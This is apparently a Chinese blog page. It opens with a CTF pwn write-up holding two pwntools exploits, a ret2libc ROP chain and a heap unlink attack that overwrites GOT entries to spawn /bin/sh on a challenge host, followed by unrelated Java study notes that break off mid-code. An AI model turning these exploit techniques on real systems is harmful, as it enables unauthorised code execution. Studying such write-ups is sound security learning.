<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#sh=remote(host='111.198.29.45', port=30875)</span></span><br><span class="line">sh = process(<span class="string">'./main'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">e = ELF(<span class="string">'./main'</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400da3</span></span><br><span class="line">main = <span class="number">0x400c8c</span></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x88</span> + <span class="string">b'\x00'</span> * <span class="number">0x10</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sh.send(<span class="string">'name'</span>)</span><br><span class="line">sh.send(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input size\n'</span>)</span><br><span class="line">sh.send(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input cun\n'</span>)</span><br><span class="line">sh.send(<span class="string">'0'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input content\n'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">puts_addr = u64(sh.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">sh.success(<span class="string">'puts_addr: '</span> + hex(puts_addr))</span><br><span class="line"><span class="comment">#题目给的libc库好像有点问题，所以我用了LibcSearcher</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line"><span class="comment">#libc = ELF('./ctflibc.so.6')</span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x88</span> + <span class="string">b'\x00'</span> * <span class="number">0x10</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line">sh.success(<span class="string">'system_addr: '</span> + hex(system_addr))</span><br><span class="line">sh.success(<span class="string">'bin_sh_addr: '</span> + hex(bin_sh_addr))</span><br><span class="line">sh.send(<span class="string">'name'</span>)</span><br><span class="line">sh.send(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input size\n'</span>)</span><br><span class="line">sh.send(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input cun\n'</span>)</span><br><span class="line">sh.send(<span class="string">'0'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input content\n'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="思路二：堆"><a href="#思路二：堆" class="headerlink" title="思路二：堆"></a>思路二：堆</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Chose one to dele"</span>);</span><br><span class="line">  result = get_num();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;content_ptrs + <span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result));</span><br><span class="line">    exist_chk[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"dele success!"</span>);</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(cnt-- - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>存在double free漏洞 且free后堆指针不会置零</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Chose one to edit"</span>);</span><br><span class="line">  result = get_num();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = exist_chk[<span class="number">4</span> * result];</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input the content"</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;content_ptrs + <span class="number">2</span> * v1), *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">4L</span>L * v1 + content_size));</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"Edit success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>edit执行之前会进行检查， 即exist_chk[4 * result] == 1 时执行edit</li>
</ul>
<p>首先申请大小为0x100（不固定）的3个堆块，cun0, cun1, cun2， 释放cun1, cun2<br>然后再申请一个大小为0x100 + 0x100 + 0x10 = 0x210 的存到cun1，伪造fake_chunk 触发unlink, 通过</p>
<blockquote>
<p>  FD = cun1-&gt;fd = cun1_addr - 0x18<br>    BK = cun1-&gt;bk = cun1_addr - 0x10<br>    FD-&gt;bk = *(cun1_addr - 0x18 + 0x18) = cun1_addr - 0x10 = BK;<br>    BK-&gt;fd = *(cun1_addr - 0x10 + 0x10) = cun1_addr - 0x18 = FD;</p>
</blockquote>
<p>将cun1_addr - 0x18 写入 cun1，然后只要控制好exist_chk就可以为所欲为</p>
<p>##exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">e = ELF(<span class="string">'./main'</span>)</span><br><span class="line">sh = remote(host=<span class="string">'159.138.137.79'</span>, port=<span class="number">64415</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, cun, content)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'$ '</span>, str(<span class="number">1</span>))</span><br><span class="line">  sh.sendlineafter(<span class="string">'Input size\n'</span>, str(size))</span><br><span class="line">  sh.sendlineafter(<span class="string">'Input cun\n'</span>, str(cun))</span><br><span class="line">  sh.sendafter(<span class="string">'Input content\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(cun)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'$ '</span>, str(<span class="number">2</span>))</span><br><span class="line">  sh.sendlineafter(<span class="string">'dele\n'</span>, str(cun))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(cun, content)</span>:</span></span><br><span class="line">  sh.sendlineafter(<span class="string">'$ '</span>, str(<span class="number">3</span>))</span><br><span class="line">  sh.sendlineafter(<span class="string">'edit\n'</span>, str(cun))</span><br><span class="line">  sh.sendafter(<span class="string">'content\n'</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="comment">#chunk1数据指针的存放地址</span></span><br><span class="line">cun1_addr = <span class="number">0x6020f0</span></span><br><span class="line">sh.sendlineafter(<span class="string">'Input your name: \n'</span>, <span class="string">'soinux'</span>)</span><br><span class="line">cre(<span class="number">0x100</span>, <span class="number">0</span>, <span class="string">'a'</span>)</span><br><span class="line">cre(<span class="number">0x100</span>, <span class="number">1</span>, <span class="string">'b'</span>)</span><br><span class="line">cre(<span class="number">0x100</span>, <span class="number">2</span>, <span class="string">'c'</span>)</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">delt(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#伪造大小为0x100的空闲fake_chunk 令chunk1的数据指针指向fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(cun1_addr - <span class="number">0x18</span>) + p64(cun1_addr - <span class="number">0x10</span>) + <span class="string">b'a'</span> * <span class="number">0xe0</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">cre(<span class="number">0x210</span>, <span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#触发unlink</span></span><br><span class="line">delt(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#在cun0 cun1 cun2 中分别写入free_got atoi_got atoi_got</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(e.got[<span class="string">'free'</span>]) + p64(<span class="number">1</span>) + p64(e.got[<span class="string">'atoi'</span>]) + p64(<span class="number">1</span>) + p64(e.got[<span class="string">'atoi'</span>])   + p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment">#free got表项修改为puts_plt</span></span><br><span class="line">edit(<span class="number">0</span>, p64(e.plt[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="comment">#泄露atoi地址</span></span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">atoi_addr = u64(sh.recvline().strip(<span class="string">b'\n'</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">'atoi_addr:'</span> + hex(atoi_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'atoi'</span>, atoi_addr)</span><br><span class="line">lib_base = atoi_addr - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">system_addr = libc.dump(<span class="string">'system'</span>) + lib_base</span><br><span class="line"><span class="comment">#atoi got表项改为system</span></span><br><span class="line">edit(<span class="number">2</span>, p64(system_addr))</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/07/JAVA/">JAVA临时笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-07</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/temporary/">temporary</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/java/">java</a></span><div class="content"><p>JAVA 7 中可以在数字字面量中包含下划线 _，以使结果更清晰。</p>
<ul>
<li>仅限单 _，不能多条相连。</li>
<li>数值开头和结尾不允许出现 _。</li>
<li>F、D 和 L的前后禁止出现 _。</li>
<li>二进制前导 b 和 十六进制 x 前后禁止出现 _。</li>
</ul>
<p>注意 ％n的使用。熟悉C风格的程序员可能习惯于看到\n来表示换行符。问题在于它给你的是一个“Unix风格”的换行符。此外，如果我们使用的是Windows，则必须指定\r\n.</p>
<p>Java也添加了一种“不分正负”的右移位运算符（&gt;&gt;&gt;），它使用了“零<br>扩展”（zeroextens&gt;ion）若你想对结果进行四舍五入，可以使用java.lang.Math的round()方法：Math.round(above)</p>
<p>如果我们对小于 int的基本数据类型（即char、byte或short）执行任何算术或按位操作,这些值会在执行操作之前类型提升为 int，并且结果值的类型为 int。 </p>
<p>Java 7 增加了在字符串上 switch 的用法。</p>
<p>如果传入的参数类型大于方法期望接收的参数类型，你必须首先做下转换，如果你不做的话，编译器就会报错。</p>
<p>this 关键字只能在非静态方法内部使用。当你调用一个对象的方法时，this生成了一个对象引用。你可以像对待其他引用一样对待这个引用。如果你在一个类的方法里调用其他该类中的方法，不要使用 this，直接调用即可使用 this 才能将自身传递给外部方法 </p>
<p>static 方法中不会存在 this。你不能在静态方法中调用非静态方法（反之可以）。静态方法是为类而创建的，不需要任何对象。事实上，这就是静态方法的主要目的，静态方法看起来就像全局方法一样，但是 Java 中不允许全局方法，一个类中的静态方法可以被其他的静态方法和静态属性访问。</p>
<p>当垃圾回收器准备回收对象的内存时，首先会调用其finalize()方法，并在下一轮的垃圾回收动作发生时，才会真正回收对象占用的内存。所以如果你打算使用finalize()，就能在垃圾回收时做一些重要的清理工作。finalize()是一个潜在的编程陷阱，因为一些程序员（尤其是 C++ 程序员）会一开始把它误认为是 C++中的析构函数（C++ 在销毁对象时会调用这个函数）。 所以有必要明确区分一下：在 C++ 中，对象总是被销毁的（在一个bug-free的程序中），而在Java中，对象并非总是被垃圾回收本地方法是一种用Java语言调用非Java语言代码的形式</p>
<p>本地方法目前只支持C和C++，但是它们可以调用其他语言写的代码，所以实际上可以调用任何代码。               </p>
<p>在非 Java 代码中，也许会调用 C 的 malloc()函数系列来分配存储空间，而且除非调用free()函数，不然存储空间永远得不到释放，造成内存泄露。但是，free() 是 C 和 C++中的函数，所以你需要在 finalize() 方法里用本地方法调用它。类的每个基本类型数据成员保证都会有一个初始值在类里定义一个对象引用时，如果不将其初始化，那么引用就会被赋值为null.在类中变量定义的顺序决定了它们初始化的顺序。即使变量定义散布在方法定义之间，它们仍会在任何方法（包括构造器）被调用之前得到初始化。</p>
<p>static 关键字不能应用于局部变量</p>
<p>初始化的顺序先是静态对象（如果它们之前没有被初始化的话），然后是非静态对象</p>
<p>概括一下创建对象的过程，假设有个名为Dog的类：即使没有显式地使用static关键字，构造器实际上也是静态方法。所以，当首次创建 Dog 类型的对象时，或是首次访问 Dog 类的静态方法或属性，Java 解释器必须在类路径中查找，以定位 Dog.class=.当加载完 Dog.class 后（后面会学到，这将创建一个Class对象），有关静态初始化的所有动作都会执行。因此，静态初始化只会在首次加载 Class 对象时初始化一次。当用 new Dog() 创建对象时，首先会在堆上为Dog对象分配足够的存储空间。分配的存储空间首先会被清零，即会将 Dog 对象中的所有基本类型数据设置为默认值（数字会被置为0，布尔型和字符型也相同），引用被置为 null。    执行所有出现在字段定义处的初始化动作。执行构造器。你将会在”复用”这一章看到，这可能会牵涉到很多动作，尤其当涉及继承的时候。显式的静态初始化你可以将一组静态初始化动作放在类里面一个特殊的”静态子句”（有时叫做静态块）中。像下面这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// housekeeping/Spoon.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Spoon</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		i = <span class="number">47</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这看起来像个方法，但实际上它只是一段跟在static关键字后面的代码块。与其他静态初始化动作一样，这段代码仅执行一次：当首次创建这个类的对象或首次访问这个类的静态成员（甚至不需要创建该类的对象）时</p>
<p>所有的类都最后继承于Object类所以你可以创建一个以 Object 数组为参数的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VarArgs</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(Object[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (Object obj: args) &#123;</span><br><span class="line">			System.out.print(obj + <span class="string">" "</span>);</span><br><span class="line">			System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		printArray(<span class="keyword">new</span> Object[] &#123;<span class="number">47</span>, (<span class="keyword">float</span>) <span class="number">3.14</span>, <span class="number">11.11</span>&#125;);</span><br><span class="line">		printArray(<span class="keyword">new</span> Object[] &#123;<span class="string">"one"</span>, <span class="string">"two"</span>, <span class="string">"three"</span>&#125;);</span><br><span class="line">		printArray(<span class="keyword">new</span> Object[] &#123;<span class="keyword">new</span> A(), <span class="keyword">new</span> A(), <span class="keyword">new</span> A()&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewVarArgs</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(Object... args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (Object obj: args) &#123;</span><br><span class="line">			System.out.print(obj + <span class="string">" "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Can take individual elements:</span></span><br><span class="line">		printArray(<span class="number">47</span>, (<span class="keyword">float</span>) <span class="number">3.14</span>, <span class="number">11.11</span>);</span><br><span class="line">		printArray(<span class="number">47</span>, <span class="number">3.14F</span>, <span class="number">11.11</span>);</span><br><span class="line">		printArray(<span class="string">"one"</span>, <span class="string">"two"</span>, <span class="string">"three"</span>);</span><br><span class="line">		printArray(<span class="keyword">new</span> A(), <span class="keyword">new</span> A(), <span class="keyword">new</span> A());</span><br><span class="line">		<span class="comment">// Or an array:</span></span><br><span class="line">		printArray((Object[]) <span class="keyword">new</span> Integer[] &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;);</span><br><span class="line">		printArray(); <span class="comment">// Empty list is OK</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OptionalTrailingArguments</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> required, String... trailing)</span> </span>&#123;</span><br><span class="line">		System.out.print(<span class="string">"required: "</span> + required + <span class="string">" "</span>);</span><br><span class="line">		<span class="keyword">for</span> (String s: trailing) &#123;</span><br><span class="line">			System.out.print(s + <span class="string">" "</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		f(<span class="number">1</span>, <span class="string">"one"</span>);</span><br><span class="line">		f(<span class="number">2</span>, <span class="string">"two"</span>, <span class="string">"three"</span>);</span><br><span class="line">		f(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Spiciness &#123;</span><br><span class="line">	NOT, MILD, MEDIUM, HOT, FLAMING</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleEnumUse</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Spiciness howHot = Spiciness.MEDIUM;</span><br><span class="line">		System.out.println(howHot);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里创建了一个名为Spiciness的枚举类型，它有5个值。由于枚举类型的实例是常量，因此按照命名惯例，它们都用大写字母表示（如果名称中含有多个单词，使用下划线分隔）    </p>
<p>你可以为每个类创建一个main();这允许对每个类进行简单的测试。当你完成测试时，不需要删除 main();你可以将其留在以后的测试中。当你使用javaDetergent时候，就调用了 Detergent.main()。但是你也可以使用javaCleanser来调用Cleanser.main()，即使 Cleanser不是一个公共类。</p>
<p>即使类具只有包访问权，也可以访问 public main()</p>
<p>java的 super 关键字引用了当前类继承的“超类”(基类)。因此表达式super.scrub() 调用方法 scrub() 的基类版本。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Art</span> </span>&#123;</span><br><span class="line">  Art() &#123;</span><br><span class="line">	System.out.println(<span class="string">"Art constructor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Drawing</span> <span class="keyword">extends</span> <span class="title">Art</span> </span>&#123;</span><br><span class="line">  Drawing() &#123;</span><br><span class="line">	System.out.println(<span class="string">"Drawing constructor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cartoon</span> <span class="keyword">extends</span> <span class="title">Drawing</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Cartoon</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	System.out.println(<span class="string">"Cartoon constructor"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	Cartoon x = <span class="keyword">new</span> Cartoon();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">Art constructor</span></span><br><span class="line"><span class="comment">Drawing constructor</span></span><br><span class="line"><span class="comment">Cartoon constructor</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span> </span>&#123;</span><br><span class="line">  Game(<span class="keyword">int</span> i) &#123;</span><br><span class="line">	System.out.println(<span class="string">"Game constructor"</span>);</span><br><span class="line">  &#125;</span><br><span 